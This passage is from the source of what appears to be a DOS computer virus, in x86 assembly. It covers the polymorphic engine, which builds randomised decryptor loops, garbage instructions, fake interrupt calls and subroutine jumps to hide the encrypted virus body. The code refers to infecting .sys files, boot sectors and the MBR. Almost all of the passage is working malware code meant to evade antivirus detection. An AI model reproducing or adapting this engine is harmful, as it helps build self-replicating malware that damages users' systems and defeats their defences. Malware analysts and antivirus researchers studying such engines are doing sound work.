   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   next_decryptor:
                   ;Next instruction counter
                   inc byte ptr cs:[decrypt_pointer][bp]

                   ;Check for subroutines witch contains next decryptor instruction
                   cmp word ptr cs:[decrypt_sub][bp],0000h
                   je build_now

                   ;If so build a call instruction to that subroutine
                   call do_call_decryptor
                   ret
   build_now:
                   ;Else get next instruction to build
                   mov bl,byte ptr cs:[decrypt_pointer][bp]

                   ;Generate decryption instructions just into subroutines
                   cmp bl,02h
                   jne entry_from_sub

                   ;No instruction was created so restore old pointer
                   dec byte ptr cs:[decrypt_pointer][bp]
                   ret
   entry_from_sub:
                   ;Entry point if calling from decryptor subroutine building
                   xor bh,bh
                   add bx,bx
                   add bx,bp

                   ;Build instruction
                   mov ax,word ptr cs:[instruction_table+bx]
                   add ax,bp

                   ;Save subroutine address
                   push ax
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Load counter register                                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   inst_load_counter:

                   mov al,0BEh
                   add al,byte ptr cs:[address_register][bp]
                   stosb

                   ;Store size of encrypted data
                   mov ax,inf_byte_size-(decryptor+file_header_size+01h)
                   stosw
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Load pointer to encrypted data                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   inst_load_pointer:
                   ;Generate garbage
                   call g_generator

                   ;Pointer reg determination
                   mov al,0BFh
                   sub al,byte ptr cs:[address_register][bp]
                   stosb

                   ;Store offset position of encrypted data
                   mov bx,offset virus_body

                   ;Add delta offset
                   add bx,word ptr cs:[file_delta][bp]

                   ;Include displacement
                   mov al,byte ptr cs:[displ_si_di][bp]
                   cbw
                   add ax,bx
                   stosw

                   ;Generate garbage
                   call g_generator
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Decrypt one byte from encrypted data area                                 ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   inst_decrypt_one:

                   ;Check type of decrypt sequence
                   cmp byte ptr cs:[decrypt_seq],00h
                   jne decrypt_with_reg

                   ;Decode add/sub/xor byte ptr seg:[si/di+displ],key
                   mov ah,80h
                   mov al,byte ptr cs:[address_seg_1][bp]
                   stosw

                   ;Store operation
                   mov ax,(end_fast_table-fast_table)/02h
                   call rand_in_range

                   ;Get displacement into subroutine table
                   add ax,ax
                   add ax,bp
                   mov bx,ax

                   ;Get opcode
                   mov ax,word ptr cs:[fast_table+bx]
                   mov byte ptr cs:[encrypt_here][bp],ah
                   xor al,byte ptr cs:[address_register][bp]
                   stosb
                   mov al,byte ptr cs:[displ_si_di][bp]
                   neg al
                   mov ah,byte ptr cs:[clave_crypt][bp]
                   stosw
                   ret

   decrypt_with_reg:

                   ;Decode a mov reg,byte ptr seg:[key]
                   mov al,byte ptr cs:[address_seg_1][bp]
                   mov ah,8Ah
                   stosw
                   mov al,byte ptr cs:[decrypt_register][bp]
                   or al,06h
                   stosb

                   ;Store position of encryption key
                   mov ax,offset clave_crypt

                   ;Add delta offset
                   add ax,word ptr cs:[file_delta][bp]
                   stosw

                   ;Decode a xor/add/sub byte ptr seg:[si/di+displ],reg
                   mov ax,(end_decrypt_table-decrypt_table)/02h
                   call rand_in_range

                   ;Get displacement into subroutine table
                   add ax,ax
                   add ax,bp
                   mov bx,ax

                   ;Get opcode
                   mov ax,word ptr cs:[decrypt_table+bx]

                   ;Write encrypt instruction
                   mov byte ptr cs:[encrypt_here][bp],al
                   mov al,byte ptr cs:[address_seg_2][bp]
                   stosw
                   mov al,byte ptr cs:[decrypt_register][bp]
                   or al,45h
                   xor al,byte ptr cs:[address_register][bp]
                   mov ah,byte ptr cs:[displ_si_di][bp]
                   neg ah
                   stosw
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Increment pointer to encrypted zone                                       ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   inst_inc_pointer:

                   mov al,47h
                   sub al,byte ptr cs:[address_register][bp]
                   stosb
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Decrement counter and loop                                                ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   inst_dec_loop:

                   ;Decode a dec reg instruction
                   mov al,4Eh
                   add al,byte ptr cs:[address_register][bp]
                   stosb

                   ;Decode a jz
                   mov al,74h
                   stosb
                   push di
                   inc di

                   ;Generate some garbage instructions
                   call g_generator

                   ;Decode a jmp to loop instruction
                   mov al,0E9h
                   stosb
                   mov ax,word ptr cs:[address_loop][bp]
                   sub ax,di
                   dec ax
                   dec ax
                   stosw

                   ;Generate some garbage instructions
                   call g_generator

                   ;Store jz displacement
                   mov ax,di
                   pop di
                   push ax
                   sub ax,di
                   dec ax
                   stosb
                   pop di
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a push reg + garbage + pop reg                                   ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_push_g_pop:

                   ;Build a random push pop
                   call do_push_pop

                   ;Get pop instruction
                   dec di
                   mov al,byte ptr es:[di]
                   push ax
                   call g_generator
                   pop ax
                   stosb
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a subroutine witch contains garbage code                         ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_subroutine:

                   cmp word ptr cs:[last_subroutine][bp],0000h
                   je create_routine
                   ret

   create_routine:

                   ;Generate a jump instruction
                   mov al,0E9h
                   stosb

                   ;Save address for jump construction
                   push di

                   ;Save address of subroutine
                   mov word ptr cs:[last_subroutine][bp],di

                   ;Get subroutine address
                   inc di
                   inc di

                   ;Generate some garbage code
                   call g_generator

                   ;Insert ret instruction
                   mov al,0C3h
                   stosb

                   ;Store jump displacement
                   mov ax,di
                   pop di
                   push ax
                   sub ax,di
                   dec ax
                   dec ax
                   stosw
                   pop di
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a subroutine witch contains one decryptor instruction            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   sub_decryptor:

                   cmp word ptr cs:[decrypt_sub][bp],0000h
                   je ok_subroutine
                   ret
   ok_subroutine:

                   ;Do not generate the loop branch into a subroutine
                   mov bl,byte ptr cs:[decrypt_pointer][bp]
                   inc bl
                   cmp bl,04h
                   jne no_loop_sub
                   ret
   no_loop_sub:
                   ;Generate a jump instruction
                   mov al,0E9h
                   stosb

                   ;Save address for jump construction
                   push di

                   ;Save address of subroutine
                   mov word ptr cs:[decrypt_sub][bp],di
                   inc di
                   inc di
                   push bx
                   call g_generator
                   pop bx
                   call entry_from_sub
                   call g_generator
   build_return:
                   ;Insert ret instruction
                   mov al,0C3h
                   stosb

                   ;Store jump displacement
                   mov ax,di
                   pop di
                   push ax
                   sub ax,di
                   dec ax
                   dec ax
                   stosw
                   pop di
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a call instruction to next decryptor subroutine                  ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_call_decryptor:

                   cmp byte ptr cs:[decrypt_pointer][bp],02h
                   jne no_store_call

                   ;Save position
                   mov word ptr cs:[address_loop][bp],di
   no_store_call:
                   ;Build a call to our subroutine
                   mov al,0E8h
                   stosb
                   mov ax,word ptr cs:[decrypt_sub][bp]
                   sub ax,di
                   stosw

                   ;Do not use this subrotine again
                   mov word ptr cs:[decrypt_sub][bp],0000h
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a call instruction to a subroutine witch some garbage code       ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_call_garbage:

                   ;Check if there is a subroutine to call
                   mov cx,word ptr cs:[last_subroutine][bp]
                   or cx,cx
                   jnz ok_call

                   ;No, so exit
                   ret
   ok_call:
                   ;Build a call to our garbage subroutine
                   mov al,0E8h
                   stosb
                   mov ax,cx
                   sub ax,di
                   stosw

                   ;Do not use this subrotine again
                   mov word ptr cs:[last_subroutine][bp],0000h
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a conditional jump followed by some garbage code                 ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_branch:
                   ;Generate a random conditional jump instruction
                   call get_rnd
                   and al,07h
                   or al,70h
                   stosb

                   ;Save address for jump construction
                   push di

                   ;Get subroutine address
                   inc di

                   ;Generate some garbage code
                   call g_generator

                   ;Store jump displacement
                   mov ax,di
                   pop di
                   push ax
                   sub ax,di
                   dec ax
                   stosb
                   pop di
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate garbage code                                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   g_generator:
                   ;Get a random number for fill count
                   call get_rnd
                   and ax,03h

                   ;Min 2, max 5 opcodes
                   inc ax
                   inc ax
   next_fill:
                   push ax
   new_fill:
                   ;Check for .sys file
                   cmp word ptr cs:[exit_address][bp],offset exit_sys - \
                                                      offset host_ret
                   jne no_building_sys

   last_byte_equal:

                   ;Select the type of filler ( 01h byte instructions for .sys files )
                   mov ax,end_byte_table-one_byte_table
                   call rand_in_range

                   ;Avoid same types in a row
                   cmp ax,word ptr cs:[last_fill_type][bp]
                   je last_byte_equal
                   mov word ptr cs:[last_fill_type][bp],ax

                   ;Get one byte instruction
                   add ax,bp
                   mov bx,ax
                   mov al,byte ptr cs:[one_byte_table+bx]

                   ;Store instruction
                   stosb
                   jmp op_return

   no_building_sys:

                   ;Select the type of filler
                   mov ax,(end_op_table-op_table)/2

                   ;Do not generate int calls into boot sector or mbr decryptor
                   cmp word ptr cs:[exit_address][bp],offset exit_mbr - \
                                                      offset host_ret
                   je eliminate_ints

                   ;Do not generate int calls into decryption loop
                   cmp byte ptr cs:[decrypt_pointer][bp],01h
                   jb no_in_loop

   eliminate_ints:
                   dec ax
                   dec ax
   no_in_loop:
                   call rand_in_range

                   ;Avoid same types in a row
                   cmp ax,word ptr cs:[last_fill_type][bp]
                   je new_fill
                   mov word ptr cs:[last_fill_type][bp],ax

                   ;Get subroutine address
                   add ax,ax
                   add ax,bp
                   mov bx,ax
                   mov ax,word ptr cs:[op_table+bx]
                   add ax,bp

                   ;Store return address
                   lea bx,word ptr [op_return][bp]
                   push bx

                   ;Call subroutine
                   push ax
                   ret
   op_return:
                   pop ax
                   dec ax
                   jnz next_fill
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate mov reg,imm ( either 8 or 16 bit but never ax or sp,di,si or bp )³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   move_imm:
                   call get_rnd

                   ;Get a reggie
                   and al,0Fh

                   ;Make it a mov reg,
                   or al,0B0h
                   test al,08h
                   jz is_8bit_mov

                   ;Make it ax,bx cx or dx
                   and al,0FBh
                   mov ah,al
                   and ah,03h

                   ;Not ax or al
                   jz move_imm
                   stosb
                   call rand_16
                   stosw
                   ret
   is_8bit_mov:
                   mov bh,al

                   ;Is al?
                   and bh,07h

                   ;Yeah bomb
                   jz move_imm
                   stosb
                   call get_rnd
                   stosb
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate mov reg,reg ( never to al or ax )                                ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   move_with_reg:

                   call rand_16

                   ;Preserve reggies and 8/16 bit
                   and ax,3F01h

                   ;Or it with addr mode and make it mov
                   or ax,0C08Ah
   reg_test:
                   test al,1
                   jz is_8bit_move_with_reg

                   ;Make source and dest = ax,bx,cx,dx
                   and ah,0DBh

   is_8bit_move_with_reg:

                   mov bl,ah
                   and bl,38h

                   ;No mov ax, 's please
                   jz move_with_reg

                   ;Let's see if 2 reggies are same reggies
                   mov bh,ah
                   sal bh,1
                   sal bh,1
                   sal bh,1
                   and bh,38h

                   ;Check if reg,reg are same
                   cmp bh,bl
                   jz move_with_reg
                   stosw
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Modify a mov reg,reg into an xchg reg,reg                                 ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   reg_exchange:
                   ;Make a mov reg,reg
                   call move_with_reg

                   ;But then remove it
                   dec di

                   ;And take advantage of the fact the opcode is still in ax
                   dec di

                   ;Was a 16 bit type?
                   test al,1b

                   ;Yeah go for an 8 bitter
                   jnz reg_exchange
                   mov bh,ah

                   ;Is one of reggies ax?
                   and bh,07h

                   ;Yah so bomb
                   jz reg_exchange

                   ;Else make it xchg ah,dl etc...
                   mov al,86h
                   stosw
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate push reg + pop reg                                               ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_push_pop:
                   mov ax,(end_bytes_2-bytes_2)/2
                   call rand_in_range
                   add ax,ax
                   add ax,bp
                   mov bx,ax

                   ;Generate push and pop instruction
                   mov ax,word ptr cs:[bytes_2+bx]

                   ;Do not use bx on .sys files
                   cmp word ptr cs:[exit_address][bp],offset exit_sys - \
                                                      offset host_ret
                   jne not_exclude_bx

                   ;Check if push bx
                   cmp al,53h
                   je do_push_pop

                   ;Check if pop bx
                   cmp ah,5Bh
                   je do_push_pop
   not_exclude_bx:
                   stosw
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a mov reg,mem or mov mem,reg                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   mov_with_mem:
                   ;Get memory prefix
                   call get_seg_reg
                   stosb

                   ;Get reg ( from or to mem and 8 or 16 bits )
                   call rand_16
                   and ax,3803h

                   ;Or it with addr mode imm 16 and make it mov
                   or ax,0688h
                   test al,01h
                   jnz do_16_bit

                   ;Check if reg is al
                   cmp ah,06h
                   jz make_to_mem
                   jmp all_clear_for_mem
   do_16_bit:
                   ;Get a valid 16bit reg
                   and ah,1Eh

                   ;Check if reg is ax
                   cmp ah,06h
                   jnz all_clear_for_mem
   make_to_mem:
                   ;Make to mem
                   and al,0FDh

   all_clear_for_mem:

                   stosw

                   ;Get size of buffer for mem operations
                   mov ax,inf_byte_size
                   call rand_in_range
                   add ax,word ptr cs:[mem_base][bp]
                   stosw
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Get a math instruction from / to mem                                      ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   make_math_with_mem:

                   ;Generate a mov reg,mem or mov mem.reg
                   call mov_with_mem

                   ;Perform transformation
                   push di
                   sub di,04h
                   mov al,byte ptr es:[di]

                   ;Preserve address mode info
                   and al,03h
                   push ax
                   call get_rnd

                   ;Get a math opcode
                   and al,38h
                   pop bx

                   ;Set address mode bits
                   or al,bl
                   stosb

                   ;Restore pointer
                   pop di
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a random int 21h call                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_int_21h:
                   call get_rnd

                   ;Choose within ah,function or ax,function+subfunction
                   and al,01h
                   jz do_int_ax
   do_int_ah:
                   mov ax,end_ah_table-ah_table
                   call rand_in_range
                   add ax,bp
                   mov bx,ax
                   mov ah,byte ptr cs:[ah_table+bx]

                   ;Do not generate same int's in a row
                   cmp ah,byte ptr cs:[last_int_type][bp]
                   jz do_int_ah

                   ;Generate mov ah,function
                   mov byte ptr cs:[last_int_type][bp],ah
                   mov al,0B4h
                   stosw

                   ;Generate int 21h
                   mov ax,021CDh
                   stosw
                   ret
   do_int_ax:
                   mov ax,(end_ax_table-ax_table)/2
                   call rand_in_range
                   add ax,ax
                   add ax,bp
                   mov bx,ax
                   mov ax,word ptr cs:[ax_table+bx]

                   ;Do not generate same int's in a row
                   cmp ah,byte ptr cs:[last_int_type][bp]
                   jz do_int_ax
                   mov byte ptr cs:[last_int_type][bp],ah

                   ;Generate mov ax,function
                   mov byte ptr es:[di],0B8h
                   inc di
                   stosw

                   ;Generate int 21h
                   mov ax,021CDh
                   stosw
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Generate a do-nothing int call                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_fake_int:
                   mov ax,offset fake_int_end-offset fake_int_table
                   call rand_in_range
                   mov bx,ax
                   add bx,bp
                   mov ah,byte ptr ds:[fake_int_table+bx]
                   mov al,0CDh
                   stosw
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Polymorphic generator data buffer                                         ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   ah_table:
                   ;Int 21h garbage functions ( function number in ah )
                   db 00Bh         ;Read entry state
                   db 019h         ;Get current drive
                   db 02Ah         ;Get current date
                   db 02Ch         ;Get current time
                   db 030h         ;Get dos version number
                   db 04Dh         ;Get error code
                   db 051h         ;Get active psp
                   db 062h         ;Get active psp
   end_ah_table:

   ax_table:
                   ;Int 21h garbage functions ( function number in ax )
                   dw 3300h        ;Get break-flag
                   dw 3700h        ;Get line-command separator
                   dw 5800h        ;Get mem concept
                   dw 5802h        ;Get umb insert
   end_ax_table:

   bytes_2:
                   ;Push and pop pairs
                   push ax
                   pop dx
                   push ax
                   pop bx
                   push ax
                   pop cx
                   push bx
                   pop dx
                   push bx
                   pop cx
                   push cx
                   pop bx
                   push cx
                   pop dx
   end_bytes_2:

   step_table:
                   ;Steps table
                   dw offset do_subroutine
                   dw offset do_call_garbage
                   dw offset g_generator
                   dw offset do_branch
                   dw offset sub_decryptor
                   dw offset next_decryptor
                   dw offset do_push_g_pop
   end_step_table:

   instruction_table:

                   ;Polymorphic decryptor table
                   dw offset inst_load_counter
                   dw offset inst_load_pointer
                   dw offset inst_decrypt_one
                   dw offset inst_inc_pointer
                   dw offset inst_dec_loop

   end_inst_table:

   op_table:
                   ;Address of op-code generator routines
                   dw offset move_with_reg
                   dw offset move_imm
                   dw offset mov_with_mem
                   dw offset make_math_with_mem
                   dw offset reg_exchange
                   dw offset do_push_pop
                   dw offset do_int_21h
                   dw offset do_fake_int
   end_op_table:

   one_byte_table:
                   ;One byte instructions for .sys decryptor
                   aaa
                   aas
                   cbw
                   clc
                   cld
                   cmc
                   cwd
                   daa
                   das
                   dec ax
                   dec cx
                   dec dx
                   dec bp
                   inc ax
                   inc cx
                   inc dx
                   inc bp
                   int 03h
                   nop
                   stc
                   std

   end_byte_table:

   fake_int_table:
                   ;Do-nothing ints
                   db 01h
                   db 1Ch
                   db 08h
                   db 0Ah
                   db 0Bh
                   db 0Ch
                   db 0Dh
                   db 0Eh
                   db 0Fh
                   db 28h
                   db 2Bh
                   db 2Ch
                   db 2Dh
                   db 70h
                   db 71h
                   db 72h
                   db 73h
                   db 74h
                   db 76h
                   db 77h
   fake_int_end:

   decrypt_table:
